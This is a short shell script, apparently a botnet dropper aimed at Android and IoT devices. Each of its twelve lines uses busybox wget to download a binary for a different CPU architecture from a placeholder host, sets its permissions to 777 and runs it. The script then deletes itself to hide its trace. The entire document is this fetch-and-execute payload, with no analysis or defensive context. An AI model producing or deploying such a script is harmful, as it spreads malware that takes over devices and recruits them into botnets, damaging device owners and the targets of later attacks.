busybox wget http://127.0.0.1/arm; chmod 777 arm; ./arm android
busybox wget http://127.0.0.1/arm5; chmod 777 arm5; ./arm5 android
busybox wget http://127.0.0.1/arm6; chmod 777 arm6; ./arm6 android
busybox wget http://127.0.0.1/arm7; chmod 777 arm7; ./arm7 android
busybox wget http://127.0.0.1/sh4; chmod 777 sh4; ./sh4 android
busybox wget http://127.0.0.1/arc; chmod 777 arc; ./arc android
busybox wget http://127.0.0.1/mips; chmod 777 mips; ./mips android
busybox wget http://127.0.0.1/mipsel; chmod 777 mipsel; ./mipsel android
busybox wget http://127.0.0.1/sparc; chmod 777 sparc; ./sparc android
busybox wget http://127.0.0.1/x86_64; chmod 777 x86_64; ./x86_64 android
busybox wget http://127.0.0.1/i686; chmod 777 i686; ./i686 android
busybox wget http://127.0.0.1/i586; chmod 777 i586; ./i586 android

rm $0